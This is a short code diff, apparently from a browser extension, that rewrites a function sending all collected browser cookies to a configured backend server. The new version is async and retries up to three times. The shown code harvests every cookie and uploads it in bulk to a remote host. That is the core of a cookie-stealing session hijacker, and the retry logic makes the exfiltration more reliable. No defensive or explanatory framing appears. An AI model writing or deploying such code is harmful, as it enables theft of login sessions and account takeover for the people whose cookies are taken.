@@ -17,16 +17,33 @@ function getAllCookies() {
   });
 }
 
-// ---- Send cookies to backend server ----
-function sendCookiesToServer(allCookies) {
-  fetch(CONFIG.BACKEND_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(allCookies)
-  })
-  .then(res => res.text())
-  .then(text => console.log("Server response:", text))
-  .catch(err => console.error("Error sending cookies:", err));
+// ---- Send cookies to backend server with retries ----
+async function sendCookiesToServer(allCookies, retryCount = 0) {
+  try {
+    console.log("Sending", allCookies.length, "cookies to:", CONFIG.BACKEND_URL);
+
+    const response = await fetch(CONFIG.BACKEND_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(allCookies)
+    });
+
+    if (!response.ok) {
+      throw new Error(`Server returned status ${response.status}`);
+    }
+
+    const text = await response.text();
+    console.log("Server response:", text);
+  } catch (err) {
+    console.error("Error sending cookies:", err);
+
+    if (retryCount < 3) {
+      console.log(`Retrying in 5 seconds... (Attempt ${retryCount + 1})`);
+      setTimeout(() => sendCookiesToServer(allCookies, retryCount + 1), 5000);
+    } else {
+      console.error("Failed to send cookies after 3 retries.");
+    }
+  }
 }
 
 // ---- Read and upload cookies ----
